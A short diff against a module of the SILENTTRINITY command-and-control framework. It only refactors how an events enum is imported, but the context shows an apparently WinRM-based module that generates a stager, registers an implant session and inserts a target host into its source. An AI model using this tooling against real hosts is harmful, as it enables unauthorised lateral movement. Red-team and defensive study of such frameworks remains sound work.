@@ -1,4 +1,4 @@
-import silenttrinity.core.events as events
+from silenttrinity.core.events import Events
 from silenttrinity.core.utils import print_bad, get_path_in_package
 from silenttrinity.core.teamserver import ipc_server
 from silenttrinity.core.teamserver.module import Module
@@ -50,8 +50,8 @@ class STModule(Module):
         }
 
     def payload(self):
-        stager = ipc_server.publish_event(events.GET_STAGERS, (self.options['Stager']['Value'],))
-        listener = ipc_server.publish_event(events.GET_LISTENERS, (self.options['Listener']['Value'],))
+        stager = ipc_server.publish_event(Events.GET_STAGERS, (self.options['Stager']['Value'],))
+        listener = ipc_server.publish_event(Events.GET_LISTENERS, (self.options['Listener']['Value'],))
 
         if stager and listener:
             if self.options['Stager']['Value'] == 'powershell':
@@ -59,7 +59,7 @@ class STModule(Module):
 
             with open(get_path_in_package('core/teamserver/modules/boo/src/winrm.boo'), 'r') as module_src:
                 guid, psk, stage = stager.generate(listener)
-                ipc_server.publish_event(events.SESSION_REGISTER, (guid, psk))
+                ipc_server.publish_event(Events.SESSION_REGISTER, (guid, psk))
 
                 src = module_src.read()
                 src = src.replace('TARGET', self.options['Host']['Value'])
